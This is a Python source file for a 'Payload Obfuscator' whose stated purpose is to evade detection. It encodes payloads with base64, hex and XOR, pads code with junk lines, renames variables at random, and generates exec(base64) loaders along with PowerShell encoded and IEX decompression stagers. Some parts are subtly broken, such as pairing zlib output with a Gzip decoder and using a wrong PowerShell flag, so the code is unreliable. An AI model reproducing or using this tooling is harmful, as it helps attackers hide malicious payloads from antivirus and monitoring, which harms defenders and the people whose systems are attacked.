#!/usr/bin/env python3
"""
Payload Obfuscator
Obfuscate payloads to evade detection
"""

import base64
import random
import string
import re
from typing import Optional


class Obfuscator:
    """Payload obfuscation techniques"""
    
    @staticmethod
    def base64_encode(data: bytes, iterations: int = 1) -> bytes:
        """Multi-layer base64 encoding"""
        result = data
        for _ in range(iterations):
            result = base64.b64encode(result)
        return result
    
    @staticmethod
    def base64_decode(data: bytes, iterations: int = 1) -> bytes:
        """Multi-layer base64 decoding"""
        result = data
        for _ in range(iterations):
            result = base64.b64decode(result)
        return result
    
    @staticmethod
    def hex_encode(data: bytes) -> bytes:
        """Hex encode payload"""
        return data.hex().encode()
    
    @staticmethod
    def hex_decode(data: str) -> bytes:
        """Hex decode payload"""
        return bytes.fromhex(data)
    
    @staticmethod
    def xor_cipher(data: bytes, key: bytes) -> bytes:
        """XOR encrypt/decrypt with key"""
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
    
    @staticmethod
    def xor_random_key(data: bytes) -> tuple:
        """XOR with random key, returns (encrypted, key)"""
        key = bytes(random.randint(0, 255) for _ in range(32))
        return Obfuscator.xor_cipher(data, key), key
    
    @staticmethod
    def char_substitution(text: str, mapping: dict = None) -> str:
        """Character substitution obfuscation"""
        if mapping is None:
            mapping = {
                'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '5',
                'A': '@', 'E': '3', 'I': '1', 'O': '0', 'S': '5',
            }
        
        result = []
        for char in text:
            result.append(mapping.get(char, char))
        return ''.join(result)
    
    @staticmethod
    def string_concat(text: str) -> str:
        """Split string into concat chunks"""
        chunk_size = random.randint(3, 8)
        chunks = [text[i:i+chunk_size] for i in range(0, len(text), chunk_size)]
        return ' + '.join(f'"{c}"' for c in chunks)
    
    @staticmethod
    def reverse_string(text: str) -> str:
        """Reverse string"""
        return text[::-1]
    
    @staticmethod
    def insert_junk(text: str, density: float = 0.3) -> str:
        """Insert junk code/comments"""
        junk_comments = [
            '// obsolete', '// deprecated', '// todo: remove',
            '/* */', '// no-op', '/* fallback */',
        ]
        
        junk_vars = [
            f'var _{random.randint(1000,9999)} = null;',
            f'let _{random.randint(1000,9999)} = undefined;',
        ]
        
        result = []
        lines = text.split('\n')
        
        for i, line in enumerate(lines):
            result.append(line)
            
            if random.random() < density:
                if random.random() < 0.5:
                    result.append(random.choice(junk_comments))
                else:
                    result.append(random.choice(junk_vars))
        
        return '\n'.join(result)
    
    @staticmethod
    def variable_rename(code: str) -> tuple:
        """Rename variables to random names, returns (obfuscated, mapping)"""
        pattern = r'\b([a-zA-Z_]\w*)\b'
        seen = set()
        mapping = {}
        counter = 0
        
        def replacer(match):
            nonlocal counter
            var = match.group(1)
            
            if var in seen or var in ['if', 'else', 'for', 'while', 'return', 'function', 'var', 'let', 'const', 'class', 'import', 'from', 'def', 'print', 'True', 'False', 'None']:
                return var
            
            seen.add(var)
            new_name = f"_{random.choice(string.ascii_lowercase)}{counter}"
            counter += 1
            mapping[var] = new_name
            return new_name
        
        obfuscated = re.sub(pattern, replacer, code)
        return obfuscated, mapping
    
    @staticmethod
    def python_encode(code: str, method: str = 'base64') -> str:
        """Python payload encoding"""
        if method == 'base64':
            encoded = base64.b64encode(code.encode()).decode()
            return f"exec(__import__('base64').b64decode('{encoded}'))"
        elif method == 'hex':
            encoded = code.encode().hex()
            return f"exec(bytes.fromhex('{encoded}'))"
        elif method == 'rot13':
            result = []
            for c in code:
                if 'a' <= c <= 'z':
                    result.append(chr((ord(c) - ord('a') + 13) % 26 + ord('a')))
                elif 'A' <= c <= 'Z':
                    result.append(chr((ord(c) - ord('A') + 13) % 26 + ord('A')))
                else:
                    result.append(c)
            return ''.join(result)
        return code
    
    @staticmethod
    def powershell_encode(script: str) -> str:
        """PowerShell payload encoding"""
        encoded = base64.b64encode(script.encode('utf-16-le')).decode()
        return f"powershell -ep {encoded}"
    
    @staticmethod
    def powershell_compressed(script: str) -> str:
        """PowerShell compressed encoding"""
        import zlib
        compressed = zlib.compress(script.encode('utf-8'))
        encoded = base64.b64encode(compressed).decode()
        return f"IEX(New-Object IO.StreamReader(New-Object IO.Compression.GzipStream(New-Object IO.MemoryStream([Convert]::FromBase64String('{encoded}')),[Text.Encoding]::ASCII))).ReadToEnd() | IEX"
